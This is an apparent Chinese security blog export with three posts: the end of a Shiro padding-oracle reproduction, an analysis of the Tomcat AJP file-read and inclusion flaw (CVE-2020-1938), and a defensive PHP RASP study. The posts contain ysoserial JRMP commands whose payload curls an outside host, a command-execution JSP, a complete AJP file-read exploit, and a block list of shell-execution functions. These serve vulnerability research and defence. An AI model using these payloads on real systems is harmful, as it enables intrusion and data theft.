不过有一点比较困惑，用URLDNS打了没结果，但是直接用5链JRMP打却可以… 这里手动膜@hu3sky师傅，教我手挖无数组的gadgets 挖掘3.2.1无数组gadget 先挖坑，挖到再说吧 Shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）漏洞复现EXP用3ndz/Shiro-721，shiro的版本1.4.1配置过程参考上文。 yso生成个jrmpclient：1java -jar ysoserial.jar JRMPClient &apos;x.x.x.x:12345&apos; &gt; JRMPClient 服务端起一个jrmplistener1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 &apos;curl https://x.x.x.x:8989&apos; 1python2 shiro_padding_oracle.py https://127.0.0.1:8088/samples_web_war_exploded/index.jsp [rememberMe的cookie] JRMPClien 漏洞分析先来看看这个版本对秘钥的处理：org/apache/shiro/mgt/AbstractRememberMeManager.java 一直跟进，可以看到将之前的硬编码秘钥换成了动态生成： padding错误在我们给rememberMe输入错误的padding后，经过上文提到的解密过程后，会抛出异常:/org/apache/shiro/crypto/JcaCipherService.class然后在org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals捕获 最后在org/apache/shiro/web/servlet/SimpleCookie.java中给返回包设置一个rememberMe的cookie，覆盖掉之前的值： 调用栈： padding正确，反序列化错误在之前的padding oracle漏洞中，依靠控制前一块密文来伪造后一块的明文，根据Padding的机制，可构造出一个bool条件，从而逐位得到明文，然后逐块得到所有明文。 也就是说通过padding获取来伪造明文的，会改变前一块的密文，也就是会影响到解密的结果。我们来看shiro中对于解密结果的处理，在DefaultSerializer.class中进行反序列化时，会失败而抛出异常：而对于客户端而言，结果是一样的，都走到了AbstractRememberMeManager.java的异常处理：接着就是给客户端重置rememberMe的cookie。 拼接序列化数据在gyyy:浅析Java序列化和反序列化这篇文章中介绍了java序列化和反序列化的机制，关键点在于ObjectOutputStream是一个Stream，他会按格式以队列方式读下去，后面拼接无关内容，不会影响反序列化。 所以现在BOOL条件就出来了，拼接无关数据，padding 正确，能正常反序列化，padding错误抛出异常。 最后payload的构造就是不断的用两个block去padding得到intermediary之后，构造密文使得解密后得到指定明文，最后拼接到原有的cookie上。 exp: https://github.com/3ndz/Shiro-721 最后这段时间从密码学到shiro反序列化的几个版本漏洞分析，算法功底还得加强，接下来的时间研究一下shiro反序列化RCE的回显问题。 参考文章： 分析调试apache shiro反序列化漏洞(CVE-2016-4437) 【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 pwn-ctf-platform-with-java-jrmp-gadget Exploiting JVM deserialization vulns despite a broken class loader Shiro 721 Padding Oracle攻击漏洞分析 p0:Shiro Padding Oracle Attack 反序列化]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat-Ajp 协议漏洞分析(CVE-2020-1938)]]></title>
    <url>%2F2020%2F03%2F02%2FTomcat-Ajp%20%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-1938)%2F</url>
    <content type="text"><![CDATA[Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。 漏洞影响该漏洞可以用来读取或包含 Tomcat 上所有 webapp目录下的任意文件，文件包含漏洞影响以下版本： Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 环境搭建测试版本8.5.16，用的mac下Mxsrvs自带的tomcat。在/bin/catalina.sh文件头部里增加一行，设置调试端口：1export JPDA_ADDRESS=9901 再修改一下startup.sh的最后一行:12#exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot;exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; jpda start &quot;$@&quot; Idea里配置一下 漏洞复现EXP： https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi 漏洞分析本地测试8.5.16版本，tomcat默认开启三个端口：在/conf/server.xml中配置： Tomcat服务器通过Connector连接器组件与客户程序建立连接，connector组件负责接收客户的请求，以及把Tomcat服务器的响应结果发送给客户。 在上图的配置中有两个connect，即8080端口对应着Http Connector，使用http（HTTP/1.1）协议；8009使用的AJP Connector，使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。更详细的介绍可以参考一下AJP协议的官方文档:The Apache Tomcat Connectors - AJP Protocol Reference Web客户访问的两种方式： 代码分析配置idea的时候先下个源码：https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar tomcat-coyote.jar!/org/apache/coyote/ajp/AjpProcessor.class#prepareRequest在AJP协议的请求结构中有这样一个字段属性attributes：对应上文代码中switch case中的匹配项，跟进Constants.SC_A_REQ_ATTRIBUTE：/org/apache/coyote/ajp/Constants.java这里定义了所有属性，Constants.SC_A_REQ_ATTRIBUTE这个case在文档中对应req_attribute属性，意思是说，如果要发超出上述基础属性以外的值，都可以通过req_attribute(0X0A)来设置其属性名和值来发送。不难理解，也就对应着这里的处理逻辑，如果是在上述之外属性，则允许我们自定义： 这里其实就是允许我们设置Request对象的attribute属性。在下文中会提到的几个属性可以被设置： javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path 封装完request对象后，继续处理Servlet的映射流程 任意文件读取当url请求未在映射的url列表里面则会通过tomcat默认的DefaultServlet会根据上面的三个属性来读取文件，/org/apache/catalina/servlets/DefaultServlet.class：跟进getRelativePath函数，当request属性中javax.servlet.include.request_uri不为空，则取出另外两个javax.servlet.include.path_info和javax.servlet.include.servlet_path属性，最后加到result里返回： 然后将结果带入this.resources.getResource函数：然后一直跟进，直到调用this.cache.getResource函数读取资源： 读取到/WEB-INF/web.xml文件： 任意文件包含当url请求映射在org.apache.jasper.servlet.JspServlet这个servlet的时候也可通过上述三个属性来控制访问的jsp文件。 随便包含一个上传的文件:upload12345&lt;%@ page language="java" import="java.lang.*" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%&gt; &lt;% Runtime.getRuntime().exec("open -a Calculator"); %&gt; EXPajp协议的通信客户端demo: https://github.com/kohsuke/ajp-client 这里贴一个threedr3am师傅的EXP: https://github.com/threedr3am/learnjavabug1234567891011121314151617181920212223242526272829303132public class FileRead &#123; public static void main(String[] args) throws IOException &#123; SimpleAjpClient ac = new SimpleAjpClient(); String host = "localhost"; int port = 8009; String uri = "/xxxxxxxxxxxxxxxest.xxx"; String file = "/index.jsp"; if (args.length == 4) &#123; host = args[0]; port = Integer.parseInt(args[1]); uri = args[2].equalsIgnoreCase("file") ? uri : "/xxxxxxxxxxxxxxxest.jsp"; file = args[3]; &#125; ac.connect(host, port); // create a message that indicates the beginning of the request TesterAjpMessage forwardMessage = ac.createForwardMessage(uri); forwardMessage.addAttribute("javax.servlet.include.request_uri", "1"); forwardMessage.addAttribute("javax.servlet.include.path_info", file); forwardMessage.addAttribute("javax.servlet.include.servlet_path", ""); forwardMessage.end(); ac.sendMessage(forwardMessage); while (true) &#123; byte[] responseBody = ac.readMessage(); if (responseBody == null || responseBody.length == 0) break; System.out.print(new String(responseBody)); &#125; ac.disconnect(); &#125;&#125; 比较简单，没啥好说的，指定路由为jsp的时候走org.apache.jasper.servlet.JspServlet处理，其他则走/org/apache/catalina/servlets/DefaultServlet默认处理。 最后洞挺牛逼的，虽然不能直接命令执行，本地的mxsrvs启动tomcat的时候默认启动8009，但是实测了一些真实环境的，独立部署的时候大都没有ajp这个端口，或许在负载均衡反代的场景比较多？ 参考文章 CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析 The Apache Tomcat Connectors - AJP Protocol Reference 如何断点调试Tomcat源码]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从0开始的PHP RASP的学习]]></title>
    <url>%2F2020%2F03%2F01%2F%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84PHP%20RASP%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[基础RASP 设计思路RASP（Runtime Application self-protection）是一种在运行时检测攻击并且进行自我保护的一种技术。PHP RASP的设计思路很直接，安全圈有一句名言叫一切输入都是有害的，我们就跟踪这些有害变量，看它们是否对系统造成了危害。我们跟踪了HTTP请求中的所有参数、HTTP Header等一切client端可控的变量，随着这些变量被使用、被复制，信息随之流动，我们也跟踪了这些信息的流动。我们还选取了一些敏感函数，这些函数都是引发漏洞的函数，例如require函数能引发文件包含漏洞，mysqli-&gt;query方法能引发SQL注入漏洞。简单来说，这些函数都是大家在代码审计时关注的函数。我们利用某些方法为这些函数添加安全检查代码。当跟踪的信息流流入敏感函数时，触发安全检查代码，如果通过安全检查，开始执行敏感函数，如果没通过安全检查，阻断执行，通过SAPI向HTTP Server发送403 Forbidden信息。当然，这一切都在PHP代码运行过程中完成。 这里主要有两个技术问题，一个是如何跟踪信息流，另一个是如何安全检查到底是怎样实现的。有两个技术思路来解决两个问题，第一个是动态污点跟踪，另一个是基于词法分析的漏洞检测。本文用主要分析的是污点标记的方法。 技术栈 taint污点分析模式 命令执行 XSS SQL payload模式：重命名+phpwaf 特征捕获检测 简而言之taint检测未知，payload上线前Fuzz检测taint：污点标记，对参数传递过程进行判断清除或保留标记payload模式：忽略参数传递过程，只分析最后作用于敏感函数的参数是否恶意 PHP生命周期简而言之，无论以哪种方式启动php程序，经过下边四个步骤：模块初始化（MINIT）、请求初始化(RINIT)、请求处理、请求结束(RSHUTDOWN)、模块结束(MSHUTDOWN)这四个阶段对应扩展开发中PHP_MINIT_FUNCTION、PHP_MSHUTDOWN_FUNCTION、PHP_RINIT_FUNCTION、PHP_RSHUTDOWN_FUNCTION四个函数来处理对应的功能。 php opcodeopcode是计算机指令中的一部分，用于指定要执行的操作，指令的格式和规范由处理器的指令规范指定。 记录一下php解析的过程： 旧版本：php代码—&gt;词法、语法分析-&gt;直接生成opcode指令 php7：php代码—&gt;词法、语法分析生成抽象语法树AST-&gt;opcode指令 简单概括一下，所有php代码最终以opcode指令的形式在zend虚拟机中执行。 函数实现PHP中函数的存储结构：/Zend/zend_compile.h#404123456789101112131415161718union _zend_function &#123; zend_uchar type; /* MUST be the first element of this struct! */ struct &#123; zend_uchar type; /* never used */ zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */ uint32_t fn_flags; zend_string *function_name; zend_class_entry *scope; union _zend_function *prototype; uint32_t num_args; uint32_t required_num_args; zend_arg_info *arg_info; &#125; common; zend_op_array op_array; zend_internal_function internal_function;&#125;; 这个联合体里边定义了四个结构体，内部函数通过扩展或者内核提供的C函数，比如time、array等，编译后用的internal_function结构；用户自定函数编译后为普通的opcode数组，用的op_array结构。剩下的common和type可以看做是internal_function和op_array的header。 实际上还有其他几类函数，暂时还没太明白： 内部函数内部函数是指由内核、扩展提供的C语言编写的function，这类函数不用经过opcode的编译过程，效率高于php用户自定义函数，调用时与普通的C程序没有差异。 Zend引擎中定义了很多内部函数供用户在PHP中使用，比如：define、defined、strlen、method_exists、class_exists、function_exist等等，除了Zend引擎中定义的内部函数，PHP扩展中也提供了大量内部函数，我们也可以灵活的通过扩展自行定制。 前文介绍zend_function为union，其中internal_function就是内部函数用到的具体结构：/Zend/zend_compile.h#3841234567891011121314151617typedef struct _zend_internal_function &#123; /* Common elements */ zend_uchar type; zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */ uint32_t fn_flags; zend_string* function_name; zend_class_entry *scope; zend_function *prototype; uint32_t num_args; uint32_t required_num_args; zend_internal_arg_info *arg_info; /* END of common elements */ void (*handler)(INTERNAL_FUNCTION_PARAMETERS); struct _zend_module_entry *module; void *reserved[ZEND_MAX_RESERVED_RESOURCES];&#125; zend_internal_function; zend_internal_function头部是一个与zend_op_array完全相同的common结构。 环境搭建开发流程php版本7.0.33，为了方便开发扩展，先下载源码：1wget https://github.com/php/php-src/archive/php-7.0.33.zip 解压后，在php源码里有一个代码生成器ext_skel，位于php-src-php-7.0.33/ext，先构建扩展基本文件：1./ext_skel --extname=passer6y 将config.m4文件中这几行前的dnl去掉： 在头文件php_passer6y.h文件中声明扩展函数：1PHP_FUNCTION(passer6y_helloworld); 接着编辑passer6y.c，添加一行：PHP_FE(passer6y_helloworld, NULL) 最后在文件末尾加入passer6y_helloworld函数代码1234567891011PHP_FUNCTION(passer6y_helloworld)&#123; char *arg = NULL; int arg_len, len; char *strg; if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &amp;arg, &amp;arg_len) == FAILURE) &#123; return; &#125; php_printf("my first ext,Hello World!\n"); RETRUN_TRUE;&#125; 编译扩展：1234apt-get install php7.0-devphpize./configure --with-php-config=/usr/bin/php-config7.0make &amp;&amp; make install 测试插件：1php -d &quot;extension=passer6y.so&quot; -r &quot;passer6y_helloworld(&apos;123&apos;);&quot; GDB调试参考文章：https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html下载php7.0.23：https://mirrors.sohu.com/php/php-7.0.23.tar.gz重新编译php，开启--enable-debug123456789101112131415161718./configure \--prefix=/opt/php_debug/ \--enable-debug \--enable-cli \--without-pear \--enable-embed \--enable-inline-optimization \--enable-shared \--enable-opcache \--enable-fpm \--with-gettext \--enable-mbstring \--with-iconv=/usr/local/libiconv \make &amp;&amp; make installmkdir /opt/php_debug/conf/ cp php.ini-development /opt/php_debug/conf/php.ini 再加个软连接方便执行：12ln -s /opt/php_debug/bin/php /usr/bin/php_debugln -s /opt/php_debug/bin/phpize /usr/bin/phpize_debug 创建插件的步骤和之前一样，在config.m4最后加上：123456if test -z "$PHP_DEBUG"; then AC_ARG_ENABLE(debug, [--enable-debug compile with debugging system], [PHP_DEBUG=$enableval], [PHP_DEBUG=no] )fi 然后再编译即可用gdb调试了 在make的时候可能会遇到libiconv的报错问题，参考这个文章安装一下就OK了，https://www.cnblogs.com/rwxwsblog/p/5451467.html vld查看代码opcode参考文章：https://www.cnblogs.com/miao-zp/p/6374311.html安装vld：123wget https://pecl.php.net/get/vld-0.14.0.tgztar zxvf vld-0.14.0.tgz cd vld-0.14.0/ 找到php-config路径: locate php-config编译：12./configure --with-php-config=/usr/bin/php-config7.0 --enable-vldmake &amp;&amp; make install 检查是否编译成功：修改php.ini /etc/php/7.0/cli/php.ini，在最后加上：1extension=vld.so 检测是否安装成功：php -r &quot;phpinfo();&quot; | grep &quot;vld&quot; 功能测试：写一个phpinfo，然后执行下边命令，-dvld.active参数为1时使用vld扩展，-dvld.execute为1时执行改文件，这里不需要执行文件，就看一下php代码转换对应的opcode指令：1php -dvld.active=1 -dvld.execute=0 1.php apache配置还是之前的源码，重新编译php1./buildconf --force &amp;&amp; ./configure --disable-all --enable-debug --prefix=/opt/php --with-apxs2=/usr/bin/apxs &amp;&amp; make &amp;&amp; make install 爆了一个线程安全的问题，执行下面两个命令凑合用着(每个子进程只有一个线程)：123// apache2 -t 查看错误日志a2dismod mpm_eventa2enmod mpm_prefork 也可以用康师傅写的dockerfile，一键拉取环境：Dockerfile 命令备忘：1php --ini // 查看php.ini默认配置路径 函数Hook两种方式： 重命名函数，并在function_table删除原函数定义，接着在php中重新定义一个该函数(像waf一样在入口include)，并对参数进行威胁判断(prvd的payload模式) 直接在底层Hook opcode，并检测函数函数(taint模式) 重命名函数这里的重命名内部函数是在MINIT阶段进行实现的，在RINIT阶段是无法对已有的内部函数进行修改名称，只能对用户函数修改(即php中自定义的函数)。 参考fate0师傅的xmark项目实现的PHP_FUNCTION(xrename_function)函数，核心在这段：12// ...Bucket *p = rename_hash_key(EG(function_table), orig_fname, new_fname, XMARK_IS_FUNCTION); 跟进rename_hash_key函数：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879static zend_always_inline Bucket *rename_hash_key(HashTable *ht, zend_string *orig_name, zend_string *new_name, int type)&#123; zend_ulong h; uint32_t nIndex; uint32_t idx; Bucket *p = NULL, *arData, *prev = NULL; zend_bool found = 0; orig_name = zend_string_tolower(orig_name); new_name = zend_string_tolower(new_name); if (zend_hash_exists(ht, new_name)) &#123; zend_string_release(orig_name); zend_string_release(new_name); zend_error(E_ERROR, "function/class '%s' already exists", ZSTR_VAL(new_name)); return NULL; &#125; h = zend_string_hash_val(orig_name); arData = ht-&gt;arData; nIndex = h | ht-&gt;nTableMask; idx = HT_HASH_EX(arData, nIndex); while (EXPECTED(idx != HT_INVALID_IDX)) &#123; prev = p; p = HT_HASH_TO_BUCKET_EX(arData, idx); if (EXPECTED(p-&gt;key == orig_name)) &#123; /* check for the same interned string */ found = 1; break; &#125; else if (EXPECTED(p-&gt;h == h) &amp;&amp; EXPECTED(p-&gt;key) &amp;&amp; EXPECTED(ZSTR_LEN(p-&gt;key) == ZSTR_LEN(orig_name)) &amp;&amp; EXPECTED(memcmp(ZSTR_VAL(p-&gt;key), ZSTR_VAL(orig_name), ZSTR_LEN(orig_name)) == 0)) &#123; found = 1; break; &#125; idx = Z_NEXT(p-&gt;val); &#125; if (!found) &#123; zend_string_release(orig_name); zend_string_release(new_name); zend_error(E_ERROR, "function/class '%s' does not exists", ZSTR_VAL(orig_name)); return NULL; &#125; // rehash if (!prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123; // only p HT_HASH(ht, nIndex) = HT_INVALID_IDX; &#125; else if (prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123; // p in middle Z_NEXT(prev-&gt;val) = Z_NEXT(p-&gt;val); &#125; else if (prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123; // p in tail Z_NEXT(prev-&gt;val) = HT_INVALID_IDX; &#125; else if (!prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123; // p in head HT_HASH(ht, nIndex) = Z_NEXT(p-&gt;val); &#125; zend_string_release(p-&gt;key); p-&gt;key = zend_string_init_interned(ZSTR_VAL(new_name), ZSTR_LEN(new_name), 1); p-&gt;h = h = zend_string_hash_val(p-&gt;key); nIndex = h | ht-&gt;nTableMask; // 重命名函数名 if (type == XMARK_IS_FUNCTION) &#123; zend_string_release(p-&gt;val.value.func-&gt;common.function_name); zend_string_addref(p-&gt;key); p-&gt;val.value.func-&gt;common.function_name = p-&gt;key; &#125; if (HT_HASH(ht, nIndex) != HT_INVALID_IDX) Z_NEXT(p-&gt;val) = HT_HASH(ht, nIndex); HT_HASH(ht, nIndex) = idx; zend_string_release(orig_name); zend_string_release(new_name); return p;&#125; Hook opcode为什么要hook opcode呢？在后来的测试中发现像echo、eval这些，它是一个语言特性，而不是一个函数，在EG(function_table)这个记录所有PHP函数的哈希表中找不到，但是他们最终都要解析成opcode，所以可以通过这种方式来劫持函数。 再举一个遇到的例子，比如在污点标记的时候，用户可控$a，但在后文经过字符串拼接$b = &quot;xx&quot;.$a，将恶意代码传递给$b变量，这个时候我们是没有办法在函数层面控制的标记的，这个时候通过处理CONCAT指令即可解决： Demo: Hook ZEND_ECHO基础，php执行流程、全局变量等 这种方式要求我们知道函数所对应的opcode代码，可以通过gdb调试的办法查找，这里以echo为例，其opcode为ZEND_ECHO。 在passer6y.h中添加定义:1int fake_echo(ZEND_OPCODE_HANDLER_ARGS); 然后在passer6y.c中添加12345int fake_echo(ZEND_OPCODE_HANDLER_ARGS)&#123; php_printf(&quot;hook success&quot;); return ZEND_USER_OPCODE_RETURN;&#125; 并在模块初始化PHP_MINIT_FUNCTION函数中添加调用：123456789PHP_MINIT_FUNCTION(passer6y)&#123; /* If you have INI entries, uncomment these lines REGISTER_INI_ENTRIES(); */ //php_override_func(&quot;echo&quot;, sizeof(&quot;echo&quot;), PHP_FN(fake_echo), NULL TSRMLS_CC); zend_set_user_opcode_handler(ZEND_ECHO, fake_echo); return SUCCESS;&#125; 编译运行： 敏感函数hook eval: INCLUDE_OR_EVAL在php-src-php-7.0.33/Zend/zend_ast.c#1258还有其他几个也使用了相同的opcode: 12345678910case ZEND_AST_INCLUDE_OR_EVAL: switch (ast-&gt;attr) &#123; case ZEND_INCLUDE_ONCE: FUNC_OP("include_once"); case ZEND_INCLUDE: FUNC_OP("include"); case ZEND_REQUIRE_ONCE: FUNC_OP("require_once"); case ZEND_REQUIRE: FUNC_OP("require"); case ZEND_EVAL: FUNC_OP("eval"); EMPTY_SWITCH_DEFAULT_CASE(); &#125; break; 显然，include_once、include、require_once、require、eval这5个函数的功能一样。 system: DO_ICALL 变量函数执行：DO_FCALL$a=&quot;system&quot;;$a(&quot;whoami&quot;); 总结一下，hook这几个opcode指令： INCLUDE_OR_EVAL DO_ICALL DO_FCALL 具体实现opcode hook通过zend_set_user_opcode_handler(zend_uchar opcode, user_opcode_handler_t handler)函数实现将指定的opcode，替换成我们自定义的。 其中user_opcode_handler_t类型是zend_execute_data *execute_data的别名： 第一次见typedef的这种用法，参考这篇文章：https://c.biancheng.net/view/298.html zend_execute_data结构的注解在文档中有解释：https://www.kancloud.cn/nickbai/php7/36328012345678910111213141516171819#define EX(element) ((execute_data)-&gt;element)//zend_compile.hstruct _zend_execute_data &#123; const zend_op *opline; //指向当前执行的opcode，初始时指向zend_op_array起始位置 zend_execute_data *call; /* current call */ zval *return_value; //返回值指针 zend_function *func; //当前执行的函数（非函数调用时为空） zval This; //这个值并不仅仅是面向对象的this，还有另外两个值也通过这个记录：call_info + num_args，分别存在zval.u1.reserved、zval.u2.num_args zend_class_entry *called_scope; //当前call的类 zend_execute_data *prev_execute_data; //函数调用时指向调用位置作用空间 zend_array *symbol_table; //全局变量符号表#if ZEND_EX_USE_RUN_TIME_CACHE void **run_time_cache; /* cache op_array-&gt;run_time_cache */#endif#if ZEND_EX_USE_LITERALS zval *literals; //字面量数组，与func.op_array-&gt;literals相同#endif&#125;; 其中第一个车管员opline的结构定义：123456789101112struct _zend_op &#123; const void *handler; //对应执行的C语言function，即每条opcode都有一个C function处理 znode_op op1; //操作数1 znode_op op2; //操作数2 znode_op result; //返回值 uint32_t extended_value; uint32_t lineno; zend_uchar opcode; //opcode指令 zend_uchar op1_type; //操作数1类型 zend_uchar op2_type; //操作数2类型 zend_uchar result_type; //返回值类型&#125;; 还有成员func的定义：123456789101112131415161718union _zend_function &#123; zend_uchar type; /* MUST be the first element of this struct! */ struct &#123; zend_uchar type; /* never used */ zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */ uint32_t fn_flags; zend_string *function_name; zend_class_entry *scope; //成员方法所属类，面向对象实现中用到 union _zend_function *prototype; uint32_t num_args; //参数数量 uint32_t required_num_args; //必传参数数量 zend_arg_info *arg_info; //参数信息 &#125; common; zend_op_array op_array; //函数实际编译为普通的zend_op_array zend_internal_function internal_function;&#125;; 现在我们要实现一个执行该opcode的函数以及参数的功能：12345678910111213141516171819202122232425262728293031static int php_do_fcall_handler(zend_execute_data *execute_data)&#123; const zend_op *opline = execute_data-&gt;opline; zend_execute_data *call = execute_data-&gt;call; zend_function *fbc = call-&gt;func; if (fbc-&gt;type == ZEND_INTERNAL_FUNCTION) &#123; // 获取参数个数 int arg_count = ZEND_CALL_NUM_ARGS(call); if (!arg_count) &#123; return ZEND_USER_OPCODE_DISPATCH; &#125; // 如果不在类中 if (fbc-&gt;common.scope == NULL)&#123; zend_string *fname = fbc-&gt;common.function_name; char *funcname = ZSTR_VAL(fname); int len = strlen(funcname); if (fname) &#123; if (strncmp("passthru", funcname, len) == 0 || strncmp("system", funcname, len) == 0 || strncmp("exec", funcname, len) == 0 || strncmp("shell_exec", funcname, len) == 0 || strncmp("proc_open", funcname, len) == 0 ) &#123; zend_error(E_WARNING, funcname); &#125; &#125; &#125; &#125; zend_error(E_WARNING, "ZEND_DO_FCALL Hook success"); return ZEND_USER_OPCODE_DISPATCH;&#125; 函数参数获取参考php7内核剖析文章的函数参数解析部分，获取到第一个参数：1234static int php_do_fcall_handler(zend_execute_data *execute_data)&#123;// ...zend_execute_data *call = execute_data-&gt;call;zval *arg = ZEND_CALL_ARG(call, 1); 格式化输出123456789101112131415static void php_warning(const char *fname, const char *arg, const char *format, ...) /* &#123;&#123;&#123; */ &#123; char *buffer, *msg; va_list args; //EG(error_reporting) = 1; va_start(args, format); vspprintf(&amp;buffer, 0, format, args); spprintf(&amp;msg, 0, "%s(\"%s\"): %s", fname, arg, buffer); efree(buffer); zend_error(E_WARNING, msg); efree(msg); va_end(args);&#125; /* &#125;&#125;&#125; *///... php_do_fcall_handler()php_warning(funcname, ZSTR_VAL(Z_STR_P(arg)), "warning function"); 接下来写一个循环遍历，获取全部参数：123456789// 创建一个数组，记录参数ZVAL_NEW_ARR(&amp;z_params); zend_hash_init(Z_ARRVAL(z_params), arg_count, NULL, ZVAL_PTR_DTOR, 0);for (i=0; i&lt;arg_count; i++) &#123; zval *p = ZEND_CALL_ARG(call, i + 1); if (Z_REFCOUNTED_P(p)) Z_ADDREF_P(p); zend_hash_next_index_insert(Z_ARRVAL(z_params), p);&#125; 剩下几个opcode挖坑 污点标记继续参考fate0师傅的xmark项目，在扩展中通过PHP_FUNCTION来定义xmark函数，帮助我们标记字符串，传递一个字符串引用，返回是否标记成功。12345678910111213141516171819202122PHP_FUNCTION(xmark)&#123; zval *z_str; if (!XMARK_G(enable)) &#123; RETURN_FALSE; &#125; // 获取参数，第一个参数为接收参数的个数，ZEND_NUM_ARGS()为有多少要多少，z为zval类型，引用传参通过zend_parse_parameters只能用z，第三个为存储参数变量的指针 if (zend_parse_parameters(ZEND_NUM_ARGS(), "z", &amp;z_str) == FAILURE) &#123; return; &#125; ZVAL_DEREF(z_str); // 在php-src-php-7.0.33/Zend/zend_types.h中定义，如果z_str是引用则找到其具体引用的zval // 只能标记字符串，所以array和其他类型得先遍历一下 if (IS_STRING != Z_TYPE_P(z_str) || Z_STRLEN_P(z_str) == 0) &#123; RETURN_FALSE; &#125; if (xmark_zstr(z_str) == FAILURE) &#123; RETURN_FALSE; &#125; RETURN_TRUE;&#125; 其中标记字符部分在xmark_zstr函数中处理：1234567891011static zend_always_inline int xmark_zstr(zval *z_str)&#123; if (!XCHECK_FLAG(Z_STR_P(z_str))) &#123; zend_string *str = zend_string_init(Z_STRVAL_P(z_str), Z_STRLEN_P(z_str), 0); ZSTR_LEN(str) = Z_STRLEN_P(z_str); zend_string_release(Z_STR_P(z_str)); // 释放z_str字符串 XMARK_FLAG(str); // 标记字符串 ZVAL_STR(z_str, str); // 标记完了后，将z_str的值设为str &#125; return SUCCESS;&#125; 在具体的XMARK_FLAG和XCHECK_FLAG函数这样实现的，xmark/php_xmark.h#41123456789101112#if PHP_VERSION_ID &lt; 70300# define IS_XMARK_FLAG (1&lt;&lt;6)# define XMARK_FLAG(str) (GC_FLAGS((str)) |= IS_XMARK_FLAG)# define XCLEAR_FLAG(str) (GC_FLAGS((str)) &amp;= ~IS_XMARK_FLAG)# define XCHECK_FLAG(str) (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)#else# define EX_CONSTANT(op) RT_CONSTANT(EX(opline), op)# define IS_XMARK_FLAG (1&lt;&lt;5)# define XMARK_FLAG(str) GC_ADD_FLAGS(str, IS_XMARK_FLAG)# define XCLEAR_FLAG(str) GC_DEL_FLAGS(str, IS_XMARK_FLAG)# define XCHECK_FLAG(str) (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)#endif 先判断php版本，7.0.3为分界线，我这里是7.0.33，通过宏定义实现标记、清除、检测flag的功能，其中GC_FLAGS函数为php内核中php-src-php-7.0.33/Zend/zend_types.h的宏定义，借助了垃圾回收结构的gc.u.v.flags字段的未被使用的标记位来记录是否被污染：而在清除标记、检测标记的实现中思路也和这个类似，通过xmark/php_xmark.h的宏进行运算。 威胁判断思路是这样的，像phpwaf一样在项目最开始的地方，污点标记HTTP请求中可控的参数，称之为source点标记：1234567891011prvd_xmark($_GET, true);prvd_xmark($_POST, true);prvd_xmark($_COOKIE, true);prvd_xmark($_FILES, true);prvd_xmark($_REQUEST, true);foreach ($_SERVER as $key =&gt; &amp;$value) &#123; if (stripos($key, 'HTTP_') === 0) &#123; prvd_xmark($value); &#125;&#125; 这些参数经过拼接、赋值等操作不断的传递，我们把他称之为filter点，在这个过程标记也要随之传递，一个例子：1234567function base64_decode($data, ...$args) &#123; $result = call_user_func(PRVD_RENAME_PREFIX."base64_decode", $data, ...$args); if (PRVD_TAINT_ENABLE &amp;&amp; prvd_xcheck($data)) &#123; prvd_xmark($result); &#125; return $result;&#125; 在遇到base64解码操作时，如果source点已被标记，则传递标记给解码后的字符串。 最后就是威胁判断的过程，这些数据在最后到达敏感函数的sink点，比如system、eval这些高危函数，判断标记是否还存在，即检测是否有可控的风险。 上报平台最后最后想了一下payload模式的缺点，在多入口php文件时，容易产生遗漏包含waf的情况，导致误报的问题，当然如果把全部逻辑都写到扩展中，与之而言的代价就是开发难度极高。其次Fuzz模式特殊漏洞检测需要指定的payload，且检测的精度取决于payload的精度。不过我觉得有污点检测功能就够了。 花了差不多半个月的时间来研究PHP的RASP机制，从php内核到各种开源的rasp项目都有了一个深入的学习。写C语言扩展，研究php底层太硬核了，属实自闭，以后打算再研究一下java的rasp机制。 最后膜前辈们的探索和分享。 参考文章： 替换PHP底层函数实现 从PHP源码与扩展开发谈PHP任意代码执行与防御 php7内核剖析 xmark: A PHP7 extension that can hook most functions/classes and parts of opcodes 一类PHP RASP实现 